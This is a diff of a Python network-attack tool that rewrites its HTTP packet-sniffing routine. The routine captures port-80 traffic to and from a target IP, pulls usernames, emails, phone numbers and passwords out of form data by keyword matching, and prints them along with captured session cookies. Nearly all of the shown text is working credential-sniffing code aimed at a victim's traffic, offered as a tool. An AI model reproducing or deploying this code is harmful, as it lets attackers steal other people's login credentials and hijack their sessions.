@@ -12,7 +12,6 @@ import ctypes
 import subprocess
 import requests
 import re
-import urllib.parse
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -66,60 +65,36 @@ class Device:
 
     def http_sniff(self):
         def http_pkt_callback(pkt):
-            # Check if the packet has a Raw layer (contains data)
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
-
-                # Only process GET or POST requests
                 if "POST" in raw_data or "GET" in raw_data:
-                    if "Host:" in raw_data and "GET" in raw_data:
-                        try:
-                            # Extract the host and path from the GET request
-                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
-                            url = f"http://{host}{path}"
-                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
-                        except Exception:
-                            pass
+                    login_data = None
+                    password_data = None
+                    
+                    # Detect login (username, email, phone, user_id, pseudonym)
+                    if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email', 'phone', 'user_id', 'pseudonym']):
+                        for line in raw_data.split('\r\n'):
+                            if '=' in line and len(line) < 100:
+                                if any(k in line.lower() for k in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']):
+                                    login_data = line.split('=')[1]
 
-                    # Process POST data to find potential credentials
-                    if "POST" in raw_data:
-                        # Form field recognition for credentials
-                        login_data = None
-                        password_data = None
+                    # Detect password (pwd, passwd, heslo)
+                    if any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
+                        for line in raw_data.split('\r\n'):
+                            if '=' in line and len(line) < 100:
+                                if any(k in line.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
+                                    password_data = line.split('=')[1]
+                    
+                    # If credentials found, print them
+                    if login_data and password_data:
+                        print(f"{Fore.GREEN}[!] Possible Credentials Found:{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    Login: {login_data}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    PWD: {password_data}{Style.RESET_ALL}")
 
-                        for field in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']:
-                            if field in raw_data.lower():
-                                login_data = re.search(rf'{field}=[^&]*', raw_data)
-                                if login_data:
-                                    login_data = login_data.group().split('=')[1]
-                                    break
-                        
-                        for field in ['password', 'pass', 'pwd', 'heslo']:
-                            if field in raw_data.lower():
-                                password_data = re.search(rf'{field}=[^&]*', raw_data)
-                                if password_data:
-                                    password_data = password_data.group().split('=')[1]
-                                    break
-
-                        # Decode URL-encoded data
-                        if login_data:
-                            login_data = urllib.parse.unquote(login_data)  # Decode URL-encoded login
-                        if password_data:
-                            password_data = urllib.parse.unquote(password_data)  # Decode URL-encoded password
-                        
-                        # Print login and password found
-                        if login_data and password_data:
-                            print(f"{Fore.GREEN}[!] Possible Credentials Found:{Style.RESET_ALL}")
-                            print(f"{Fore.GREEN}login: {login_data}{Style.RESET_ALL}")
-                            print(f"{Fore.GREEN}pwd: {password_data}{Style.RESET_ALL}")
-
-                    # Optional: Capture cookies and other sensitive data
                     if "Set-Cookie:" in raw_data:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                         print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
-        # Start sniffing HTTP packets on port 80 for the target IP
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
